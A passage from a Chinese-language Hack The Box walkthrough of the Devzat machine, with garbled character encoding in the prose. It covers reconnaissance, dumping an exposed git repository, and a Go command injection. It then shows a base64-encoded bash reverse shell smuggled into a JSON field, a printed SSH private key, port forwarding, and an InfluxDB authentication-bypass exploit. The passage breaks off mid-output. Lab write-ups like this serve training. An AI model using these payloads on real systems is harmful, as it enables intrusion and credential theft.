fingerprint:\nOS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=34522%PV=Y%DS=2%DC=T%G=Y%TM=6210A83\nOS:2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 554/tcp)\nHOP RTT       ADDRESS\n1   241.16 ms 10.10.14.1\n2   241.26 ms devzat.htb (10.10.11.118)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 93.93 seconds\n```\n### Http\nè¿™é‡Œæœ‰ä¸€ä¸ªhttpæœåŠ¡åœ¨80ç«¯å£ï¼Œç›´æ¥è®¿é—®ipä¼šè¢«è·³è½¬åˆ°devzat.htbé¡µé¢ï¼Œå’±ä»¬æ·»åŠ åˆ°hostså†ç»§ç»­è®¿é—®\n\n```bash\necho 10.10.11.118 devzat.htb >> /etc/hosts\n```\n![](Hackthebox-Devzat/0cecff08-8715-4b72-b911-715c109787c0.png)\n\nè¿™ä¸ªåŠŸèƒ½é¡µé¢æœ‰ç‚¹ä¸æ˜æ‰€ä»¥ï¼Œå¾€ä¸‹çœ‹çœ‹\n\n![](Hackthebox-Devzat/874775c0-4e3b-432b-a6ed-5f7dcf9b9b1d.png)\n\nè¿™é‡Œæç¤ºäº†ä¸€æ¡å‘½ä»¤ï¼ŒsshæœåŠ¡ç–‘ä¼¼åœ¨8000ç«¯å£\n\næœç´¢ç›¸å…³èµ„æ–™ï¼Œæ‰¾åˆ°äº†ç›¸å…³å·¥å…·\n\n> [https://github.com/quackduck/devzat](https://github.com/quackduck/devzat)\n\nå»æµ‹è¯•ä¸€ä¸‹è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh -l test devzat.htb -p 8000\n                                                                                                                                                                                                   8 minutes earlier\ndevbot: test has joined the chat \ntest: test \ntest: test \ntest: test \ntest: test \ndevbot: test has left the chat \ndevbot: test has joined the chat \n                                                                                                                                                                                                    1 minute earlier\ndevbot: test has left the chat \ndevbot: test stayed on for 6 minutes \ndevbot: test has joined the chat \ndevbot: test has left the chat \ndevbot: lucifiel has joined the chat\ndevbot: lucifiel has left the chat\ndevbot: test has joined the chat \n                                                                                                                                                                                          Less than a minute earlier\ndevbot: test has left the chat \ndevbot: test stayed on for 1 minute \nWelcome to the chat. There are no more users\ndevbot: test has joined the chat\ntest: /help\n[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat\n[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.\n[SYSTEM] \n[SYSTEM] Interesting features:\n[SYSTEM] â€¢ Many, many commands. Run /commands.\n[SYSTEM] â€¢ Rooms! Run /room to see all rooms and use /room #foo to join a new room.\n[SYSTEM] â€¢ Markdown support! Tables, headers, italics and everything. Just use in place of newlines.\n[SYSTEM] â€¢ Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.\n[SYSTEM] â€¢ Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.\n[SYSTEM] â€¢ Timezone support, use /tz Continent/City to set your timezone.\n[SYSTEM] â€¢ Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.\n[SYSTEM] â€¢ Emoji replacements! (like on Slack and Discord)\n[SYSTEM] \n[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.\n[SYSTEM] \n[SYSTEM] Made by Ishan Goel with feature ideas from friends.\n[SYSTEM] Thanks to Caleb Denio for lending his server!\n[SYSTEM] \n[SYSTEM] For a list of commands run\n[SYSTEM] â”ƒ /commands\ntest: /commands\n[SYSTEM] Commands\n[SYSTEM] clear - Clears your terminal\n[SYSTEM] message - Sends a private message to someone\n[SYSTEM] users - Gets a list of the active users\n[SYSTEM] all - Gets a list of all users who has ever connected\n[SYSTEM] exit - Kicks you out of the chat incase your client was bugged\n[SYSTEM] bell - Toggles notifications when you get pinged\n[SYSTEM] room - Changes which room you are currently in\n[SYSTEM] id - Gets the hashed IP of the user\n[SYSTEM] commands - Get a list of commands\n[SYSTEM] nick - Change your display name\n[SYSTEM] color - Change your display name color\n[SYSTEM] timezone - Change how you view time\n[SYSTEM] emojis - Get a list of emojis you can use\n[SYSTEM] help - Get generic info about the server\n[SYSTEM] tictactoe - Play tictactoe\n[SYSTEM] hangman - Play hangman\n[SYSTEM] shrug - Drops a shrug emoji\n[SYSTEM] ascii-art - Bob ross with text\n[SYSTEM] example-code - Hello world!\ntest: /users\n[SYSTEM] [test]\n```\næ²¡æœ‰å‘ç°å¯åˆ©ç”¨çš„ç‚¹\n\n### Fuzz\nå»fuzzä¸€ä¸‹å­åŸŸåçœ‹ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -c -u http://devzat.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.devzat.htb\"  -mc 200 \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://devzat.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Header           : Host: FUZZ.devzat.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200\n________________________________________________\n\npets                    [Status: 200, Size: 510, Words: 20, Lines: 21]\n:: Progress: [4989/4989] :: Job [1/1] :: 166 req/sec :: Duration: [0:00:33] :: Errors: 0 ::\n```\næœ‰ä¸€ä¸ªpetsï¼ŒåŠ å…¥hostsé‡Œ\n\n```bash\necho 10.10.11.118 pets.devzat.htb >> /etc/hosts\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://pets.devzat.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 510\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://pets.devzat.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 510\n________________________________________________\n\n.git                    [Status: 301, Size: 41, Words: 3, Lines: 3]\n.git/index              [Status: 200, Size: 3884, Words: 51, Lines: 11]\n.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6]\n.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]\n.git/logs/              [Status: 200, Size: 63, Words: 3, Lines: 5]\nbuild                   [Status: 301, Size: 42, Words: 3, Lines: 3]\ncss                     [Status: 301, Size: 40, Words: 3, Lines: 3]\nserver-status           [Status: 403, Size: 280, Words: 20, Lines: 10]\n:: Progress: [4686/4686] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:31] :: Errors: 0 ::\n```\nå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª.gitæ–‡ä»¶ï¼Œé‚£å°±æ˜¯æœ‰gitå¤‡ä»½ï¼Œä¸‹è½½ä¸‹æ¥\n\n### GitTools\n> [https://github.com/LucifielHack/GitTools](https://github.com/LucifielHack/GitTools)\n\nä½¿ç”¨GitToolsç»™ä¸‹è½½ä¸‹æ¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/GitTools]\nâ””â”€# ./Dumper/gitdumper.sh http://pets.devzat.htb/.git/ pets\n###########\n# GitDumper is part of https://github.com/internetwache/GitTools\n#\n# Developed and maintained by @gehaxelt from @internetwache\n#\n# Use at your own risk. Usage might be illegal in certain circumstances. \n# Only for educational purposes!\n###########\n```\nä½¿ç”¨gitdumperç»™dumpä¸‹æ¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/GitTools]\nâ””â”€# ./Extractor/extractor.sh pets ~/Desktop/pets/\n###########\n# Extractor is part of https://github.com/internetwache/GitTools\n#\n# Developed and maintained by @gehaxelt from @internetwache\n#\n# Use at your own risk. Usage might be illegal in certain circumstances. \n# Only for educational purposes!\n###########\n```\nç„¶åä½¿ç”¨exractorç»™è§£å‹å‡ºæ¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pets]\nâ””â”€# ls -la\næ€»ç”¨é‡ 20\ndrwxr-xr-x 5 root root 4096  2æœˆ 19 03:50 .\ndrwxr-xr-x 6 root root 4096  2æœˆ 19 03:50 ..\ndrwxr-xr-x 4 root root 4096  2æœˆ 19 03:50 0-464614f32483e1fde60ee53f5d3b4d468d80ff62\ndrwxr-xr-x 4 root root 4096  2æœˆ 19 03:50 1-ef07a04ebb2fc92cf74a39e0e4b843630666a705\ndrwxr-xr-x 4 root root 4096  2æœˆ 19 03:50 2-8274d7a547c0c3854c074579dfc359664082a8f6\n```\nä¸‹è½½å¯ä»¥å»æœ¬åœ°æŸ¥çœ‹äº†\n\n### ä»£ç å®¡è®¡\n```go\npackage main\n\nimport (\n        \"embed\"\n        \"encoding/json\"\n        \"fmt\"\n        \"io/fs\"\n        \"io/ioutil\"\n        \"log\"\n        \"net/http\"\n        \"os/exec\"\n        \"time\"\n)\n\n//go:embed static/public\nvar web embed.FS\n\n//go:embed static/public/index.html\nvar index []byte\n\ntype Pet struct {\n        Name            string `json:\"name\"`\n        Species         string `json:\"species\"`\n        Characteristics string `json:\"characteristics\"`\n}\n\nvar (\n        Pets []Pet = []Pet{\n                {Name: \"Cookie\", Species: \"cat\", Characteristics: loadCharacter(\"cat\")},\n                {Name: \"Mia\", Species: \"cat\", Characteristics: loadCharacter(\"cat\")},\n                {Name: \"Chuck\", Species: \"dog\", Characteristics: loadCharacter(\"dog\")},\n                {Name: \"Balu\", Species: \"dog\", Characteristics: loadCharacter(\"dog\")},\n                {Name: \"Georg\", Species: \"gopher\", Characteristics: loadCharacter(\"gopher\")},\n                {Name: \"Gustav\", Species: \"giraffe\", Characteristics: loadCharacter(\"giraffe\")},\n                {Name: \"Rudi\", Species: \"redkite\", Characteristics: loadCharacter(\"redkite\")},\n                {Name: \"Bruno\", Species: \"bluewhale\", Characteristics: loadCharacter(\"bluewhale\")},\n        }\n)\n\nfunc loadCharacter(species string) string {\n        cmd := exec.Command(\"sh\", \"-c\", \"cat characteristics/\"+species)\n        stdoutStderr, err := cmd.CombinedOutput()\n        if err != nil {\n                return err.Error()\n        }\n        return string(stdoutStderr)\n}\n\nfunc getPets(w http.ResponseWriter, r *http.Request) {\n        json.NewEncoder(w).Encode(Pets)\n}\n\nfunc addPet(w http.ResponseWriter, r *http.Request) {\n        reqBody, _ := ioutil.ReadAll(r.Body)\n        var addPet Pet\n        err := json.Unmarshal(reqBody, &addPet)\n        if err != nil {\n                e := fmt.Sprintf(\"There has been an error: %+v\", err)\n                http.Error(w, e, http.StatusBadRequest)\n                return\n        }\n\n        addPet.Characteristics = loadCharacter(addPet.Species)\n        Pets = append(Pets, addPet)\n\n        w.WriteHeader(http.StatusOK)\n        fmt.Fprint(w, \"Pet was added successfully\")\n}\n\nfunc handleRequest() {\n        build, err := fs.Sub(web, \"static/public/build\")\n        if err != nil {\n                panic(err)\n        }\n\n        css, err := fs.Sub(web, \"static/public/css\")\n        if err != nil {\n                panic(err)\n        }\n\n        webfonts, err := fs.Sub(web, \"static/public/webfonts\")\n        if err != nil {\n                panic(err)\n        }\n\n        spaHandler := http.HandlerFunc(spaHandlerFunc)\n        // Single page application handler\n        http.Handle(\"/\", headerMiddleware(spaHandler))\n\n        // All static folder handler\n        http.Handle(\"/build/\", headerMiddleware(http.StripPrefix(\"/build\", http.FileServer(http.FS(build)))))\n        http.Handle(\"/css/\", headerMiddleware(http.StripPrefix(\"/css\", http.FileServer(http.FS(css)))))\n        http.Handle(\"/webfonts/\", headerMiddleware(http.StripPrefix(\"/webfonts\", http.FileServer(http.FS(webfonts)))))\n        http.Handle(\"/.git/\", headerMiddleware(http.StripPrefix(\"/.git\", http.FileServer(http.Dir(\".git\")))))\n\n        // API routes\n        apiHandler := http.HandlerFunc(petHandler)\n        http.Handle(\"/api/pet\", headerMiddleware(apiHandler))\n        log.Fatal(http.ListenAndServe(\":5000\", nil))\n}\n\nfunc spaHandlerFunc(w http.ResponseWriter, r *http.Request) {\n        w.WriteHeader(http.StatusOK)\n        w.Write(index)\n}\n\nfunc petHandler(w http.ResponseWriter, r *http.Request) {\n        // Dispatch by method\n        if r.Method == http.MethodPost {\n                addPet(w, r)\n        } else if r.Method == http.MethodGet {\n                getPets(w, r)\n\n        } else {\n                http.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed)\n        }\n        // TODO: Add Update and Delete\n}\n\nfunc headerMiddleware(next http.Handler) http.Handler {\n        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n                w.Header().Add(\"Server\", \"My genious go pet server\")\n                next.ServeHTTP(w, r)\n        })\n}\n\nfunc main() {\n        resetTicker := time.NewTicker(5 * time.Second)\n        done := make(chan bool)\n\n        go func() {\n                for {\n                        select {\n                        case <-done:\n                                return\n                        case <-resetTicker.C:\n                                // Reset Pets to prestaged ones\n                                Pets = []Pet{\n                                        {Name: \"Cookie\", Species: \"cat\", Characteristics: loadCharacter(\"cat\")},\n                                        {Name: \"Mia\", Species: \"cat\", Characteristics: loadCharacter(\"cat\")},\n                                        {Name: \"Chuck\", Species: \"dog\", Characteristics: loadCharacter(\"dog\")},\n                                        {Name: \"Balu\", Species: \"dog\", Characteristics: loadCharacter(\"dog\")},\n                                        {Name: \"Georg\", Species: \"gopher\", Characteristics: loadCharacter(\"gopher\")},\n                                        {Name: \"Gustav\", Species: \"giraffe\", Characteristics: loadCharacter(\"giraffe\")},\n                                        {Name: \"Rudi\", Species: \"redkite\", Characteristics: loadCharacter(\"redkite\")},\n                                        {Name: \"Bruno\", Species: \"bluewhale\", Characteristics: loadCharacter(\"bluewhale\")},\n                                }\n\n                        }\n                }\n        }()\n\n        handleRequest()\n\n        time.Sleep(500 * time.Millisecond)\n        resetTicker.Stop()\n        done <- true\n}\n```\nå‘ç°å­˜åœ¨ä¸€ä¸ªmain.goçš„æ–‡ä»¶ï¼Œå’±ä»¬çœ‹ä¸€ä¸‹\n\n```go\ncmd := exec.Command(\"sh\", \"-c\", \"cat characteristics/\"+species)\naddPet.Characteristics = loadCharacter(addPet.Species)\n```\nçœ‹ä¸‹è¿™ä¸¤å¥ï¼Œå¾ˆæ˜æ˜¾çš„å‘½ä»¤æ³¨å…¥ã€‚\n\næ·»åŠ å® ç‰©åŠŸèƒ½ç‚¹çš„speciesç›´æ¥æ‹¼æ¥åœ¨cmdä¸­ï¼Œå’±ä»¬å»æ„é€ Exploit\n\n## æ¼æ´åˆ©ç”¨\n### Shell\n```bash\necho \"bash -c 'exec bash -i &>/dev/tcp/10.10.14.47/4444 <&1'\" | base64\nYmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDcvNDQ0NCA8JjEnCg==\n\n{\"name\":\"lucifiel\",\"species\":\"cat;echo -n 'YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDcvNDQ0NCA8JjEnCg==' | base64 -d | bash\"}\n```\né¦–å…ˆå»æŠ“ä¸ªåŒ…\n\n![](Hackthebox-Devzat/4f455f7e-e5a1-4115-a102-7d0088690a18.png)\n\næ¥ç€æ›¿æ¢expç„¶åä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444        \nlistening on [any] 4444 ...\nconnect to [10.10.14.47] from (UNKNOWN) [10.10.11.118] 33274\nbash: cannot set terminal process group (889): Inappropriate ioctl for device\nbash: no job control in this shell\npatrick@devzat:~/pets$ whoami&&id\nwhoami&&id\npatrick\nuid=1000(patrick) gid=1000(patrick) groups=1000(patrick)\n```\næˆåŠŸè·å¾—ä¸€ä¸ªshell\n\nä½¿ç”¨python3è·å¾—ä¸€ä¸ªäº¤äº’å¼shell\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\n```\n### User\nåœ¨å½“å‰ç”¨æˆ·patrickç›®å½•ä¸‹å­˜åœ¨sshç§˜é’¥\n\n```bash\ncat /home/.ssh/id_rsa\n```\n```bash\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEA0z5vGXu4rlJWm2ffbekliU8N7KSuRj9tahP3+xTk/z/nKzb2UCi7\nkh7oISloGR+05LuzZrv1sYWcFVBQ6ZIgxtZkj3iurshqbk5p3AqJhbw9wmpXRa2QjcW0Pw\nW1nsjVaRfbM3lU8H3YGOTzaEBUNK3ksLXp1emrRAOVn62c4UmV1rlhJ/uxwfQusNWmqopD\n0A0EsUQK3C2WOXIIzct+GTJOzC2lnIivff8RGLjRAG0db9P/CLVb+acg/EDBQ/rNjcB5On\nid4apLNheVSXqiGS9oF7wZoL0CfHwS29KQTesWtcZDgD6UJKwS9KRBKihULHSWiMw6QgRp\nhC9BPw3zug7MqvnZnBbLccH7zTvODpqA9lAK2/z8WT2jqMIxOOxkR5evHAyIt1CyoyqDIN\nkA+862sn3Oylz/KhDtI+V8LNJ1zJZelTvRrp+pPcml5BL6xY3y7nKiBK3e3i7UbwxcHH8N\nFXX5UnZnxM/zZFfJBaV5u4qKUynXMDXKozZ0tUyLAAAFiF8Fn3tfBZ97AAAAB3NzaC1yc2\nEAAAGBANM+bxl7uK5SVptn323pJYlPDeykrkY/bWoT9/sU5P8/5ys29lAou5Ie6CEpaBkf\ntOS7s2a79bGFnBVQUOmSIMbWZI94rq7Iam5OadwKiYW8PcJqV0WtkI3FtD8FtZ7I1WkX2z\nN5VPB92Bjk82hAVDSt5LC16dXpq0QDlZ+tnOFJlda5YSf7scH0LrDVpqqKQ9ANBLFECtwt\nljlyCM3LfhkyTswtpZyIr33/ERi40QBtHW/T/wi1W/mnIPxAwUP6zY3AeTp4neGqSzYXlU\nl6ohkvaBe8GaC9Anx8EtvSkE3rFrXGQ4A+lCSsEvSkQSooVCx0lojMOkIEaYQvQT8N87oO\nzKr52ZwWy3HB+807zg6agPZQCtv8/Fk9o6jCMTjsZEeXrxwMiLdQsqMqgyDZAPvOtrJ9zs\npc/yoQ7SPlfCzSdcyWXpU70a6fqT3JpeQS+sWN8u5yogSt3t4u1G8MXBx/DRV1+VJ2Z8TP\n82RXyQWlebuKilMp1zA1yqM2dLVMiwAAAAMBAAEAAAGBAKJYxkugcRPQBe2Ti/xNhWKclg\nf7nFAyqOUwiZG2wjOFKiVlLTH3zAgFpsLtrqo4Wu67bqoS5EVVeNpMipKnknceB9TXm/CJ\n6Hnz25mXo49bV1+WGJJdTM4YVmlk+usYUCNfiUBrDCNzo+Ol+YdygQSnbC1+8UJMPiqcUp\n6QcBQYWIbYm9l9r2RvRH71BAznDCzWBHgz4eDLTDvD7w4ySSwWJMb4geHmjnDX2YzVZRLd\nyRTLqaJIt3ILxub24VFcar2fglxwrgxRwxuQdvxarivlg5Rf1HydXGKxcL8s+uV332VVae\niNRaI7IYma7bJ98AOiqQo0afpOxl3MT6XRZoR5aOU8YxMulyKrZTwhotRPMW7qRNU4AYUp\nJIe6dKM3M54wv/bX7MOC/R+eNG+VEesWkgfh5viSdv+tBplLoWd+zxTVR3V/C+OgbNUc/W\n/leKXtrVb5M/RC+mj5/obMvYN3vjzNjw1KeLQQ17e/tJnvgu++ctfPjdxNYVnHyWhFeQAA\nAMAOmD51s3F8svBCLm1/Zh5cm8A2xp7GZUuhEjWY3sKzmfFIyDpVOBVPWgwiZIJjuNwDno\nisr46a9Cjr2BrnIR7yRln7VD+wKG6jmyCjRSv1UzN+XRi9ELAJ6bGuk/UjUcoll0emuUAC\nR7RBBMz+gQlsLXdvXF/Ia4KLiKZ2CIRQI7BAwdmGOt8wRnscC/+7xH+H3Xu/drrFDYHYO0\nLI0OdTC9PLvEW86ARATr7MFl2cn0vohIF1QBJusSbqoz/ZPPQAAADBAPPpZh/rJABSXWnM\nE+nL2F5a8R4sAAD44oHhssyvGfxFI2zQEo26XPHpTJyEMAb/HaluThpqwNKe4h0ZwA2rDJ\nflcG8/AceJl4gAKiwrlfuGUUyLVfH2tO2sGuklFHojNMLiyD2oAukUwH64iqgVgJnv0ElJ\ny079+UXKIFFVPKjpnCJmbcJrli/ncp222YbMICkWu27w5EIoA7XvXtJgBl1gsXKJL1Jztt\nH8M6BYbhAgO3IW6fuFvvdpr+pjdybGjQAAAMEA3baQ2D+q8Yhmfr2EfYj9jM172YeY8shS\nvpzmKv4526eaV4eXL5WICoHRs0fvHeMTBDaHjceCLHgNSb5F8XyJy6ZAFlCRRkdN0Xq+M0\n7vQUuwxKHGTf3jh3gXfx/kqM8jZ4KBkp2IO6AJPsWZ195TTZfmOHh9ButdCfG8F/85o5gQ\nIK7vdmRpSWFVI5gW0PRJtOgeBoAYRnHL3mOj+4KCBAiUgkzY/VrMulHwLiruuuLOYUW00G\nn3LMfTlr/Fl0V3AAAADnBhdHJpY2tAZGV2emF0AQIDBA==\n-----END OPENSSH PRIVATE KEY-----\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# chmod 700 id_rsa\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh patrick@10.10.11.118 -i id_rsa        \nWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat 19 Feb 2022 09:20:45 AM UTC\n\n  System load:  0.01              Processes:                243\n  Usage of /:   55.8% of 7.81GB   Users logged in:          1\n  Memory usage: 23%               IPv4 address for docker0: 172.17.0.1\n  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118\n\n107 updates can be applied immediately.\n33 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sat Feb 19 09:18:30 2022 from 10.10.16.23\n```\næˆåŠŸç™»å½•ssh\n\n```bash\npatrick@devzat:~$ whoami&&id\npatrick\nuid=1000(patrick) gid=1000(patrick) groups=1000(patrick)\n```\n### ç«¯å£è½¬å‘\n```bash\npatrick@devzat:~$ ss -tunlp\nNetid             State               Recv-Q              Send-Q                           Local Address:Port                           Peer Address:Port             Process                                       \nudp               UNCONN              0                   0                                127.0.0.53%lo:53                                  0.0.0.0:*                                                              \ntcp               LISTEN              0                   4096                             127.0.0.53%lo:53                                  0.0.0.0:*                                                              \ntcp               LISTEN              0                   4096                                 127.0.0.1:8086                                0.0.0.0:*                                                              \ntcp               LISTEN              0                   128                                    0.0.0.0:22                                  0.0.0.0:*                                                              \ntcp               LISTEN              0                   4096                                 127.0.0.1:8443                                0.0.0.0:*                                                              \ntcp               LISTEN              0                   4096                                 127.0.0.1:5000                                0.0.0.0:*                 users:((\"petshop\",pid=908,fd=3))             \ntcp               LISTEN              0                   511                                          *:80                                        *:*                                                              \ntcp               LISTEN              0                   128                                       [::]:22                                     [::]:*                                                              \ntcp               LISTEN              0                   4096                                         *:8000                                      *:*                 users:((\"devchat\",pid=907,fd=7))\n```\nè¿™é‡Œæˆ‘ä»¬æŠŠ8086ç«¯å£è½¬å‘å‡ºå»\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh -L 8086:127.0.0.1:8086 patrick@10.10.11.118 -i id_rsa \nWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat 19 Feb 2022 09:30:33 AM UTC\n\n  System load:  0.0               Processes:                246\n  Usage of /:   55.8% of 7.81GB   Users logged in:          1\n  Memory usage: 23%               IPv4 address for docker0: 172.17.0.1\n  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118\n\n107 updates can be applied immediately.\n33 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sat Feb 19 09:20:46 2022 from 10.10.14.47\n```\næˆåŠŸè½¬å‘å‡ºæ¥\n\n### Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -p 8086 -sC -sV 127.0.0.1                      \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 04:33 EST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000048s latency).\n\nPORT     STATE SERVICE VERSION\n8086/tcp open  http    InfluxDB http admin 1.7.5\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.82 seconds\n```\n### Exploit\nè¿™é‡Œå‘ç°æ˜¯InfluxDBï¼Œå»æœç´¢ä¸€ä¸‹æ˜¯å¦æœ‰ç›¸å…³çš„æ¼æ´\n\n> [https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)\n\nä½¿ç”¨è¯¥Exploitè¿›è¡Œæ”»å‡»\n\n```bash\ngit clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git\ncd InfluxDB-Exploit-CVE-2019-20933\npip install -r requirements.txt\n```\nä¸‹è½½å®‰è£…æ‰€éœ€è¦çš„ç¯å¢ƒ\n\nç„¶åæ‰§è¡Œ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/InfluxDB-Exploit-CVE-2019-20933]\nâ””â”€# python3 __main__.py\n\n  _____        __ _            _____  ____    ______            _       _ _   \n |_   _|      / _| |          |  __ \\|  _ \\  |  ____|          | |     (_) |  \n   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ \n   | | | '_ \\|  _| | | | \\ \\/ / |  | |  _ <  |  __| \\ \\/ / '_ \\| |/ _ \\| | __|\n  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ \n |_____|_| |_|_| |_|\\__,_/_/\\_\\_____/|____/  |______/_/\\_\\ .__/|_|\\___/|_|\\__|\n                                                         | |                  \n                                                         |_|                  \n - using CVE-2019-20933\n\nHost (default: localhost): \nPort (default: 8086): \nUsername <OR> path to username file (default: users.txt): \n\nBruteforcing usernames ...\n[v] admin\n\nHost vulnerable !!!\n\nDatabases:\n\n1) devzat\n2) _internal\n\n.quit to exit\n[admin@127.0.0.1] Database: devzat\n\nStarting InfluxDB shell - .back to go back\n[admin@127.0.0.1/devzat] $ SELECT * FROM \"user\"\n{\n    \"results\": [\n        {\n            \"series\": [\n                {\n                    \"columns\": [\n                        \"time\",\n                        \"enabled\",\n                        \"password\",\n                        \"username\"\n                    ],\n                    \"name\": \"user\",\n                    \"values\": 